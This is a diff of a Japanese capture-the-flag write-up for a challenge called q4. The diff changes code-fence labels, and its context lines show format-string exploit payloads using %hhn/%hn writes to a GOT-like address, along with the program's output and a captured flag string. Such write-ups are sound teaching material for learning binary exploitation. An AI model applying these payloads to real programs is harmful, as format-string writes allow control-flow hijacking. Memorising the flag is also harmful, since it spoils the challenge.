@@ -261,7 +261,7 @@ little-endianなので、**"\xe0\x99\x04\x08"**で表される
 
 これを元に、payloadを構成すると、
 
-```sh
+```console
 [q4@localhost ~]$ ./q4 <<< $(python -c 'print "\xe0\x99\x04\x08\xe1\x99\x04\x08\xe2\x99\x04\x08\xe3\x99\x04\x08" + "%129x%6$hhn%245x%7$hhn%126x%8$hhn%4x%9$hhn"')
 What's your name?
 Hi, ��������                                                                                                                              400                                                                                                                                                                                                                                               4d08c0                                                                                                                             8  14
@@ -285,7 +285,7 @@ FLAG_nwW6eP503Q3QI0zw
 
 したがって
 
-```sh
+```console
 [q4@localhost ~]$ ./q4 <<< $(python -c 'print "\xe0\x99\x04\x08\xe2\x99\x04\x08" + "%34441x%6$hn%33139x%7$hn"')
 Hi, ����
 ⋮
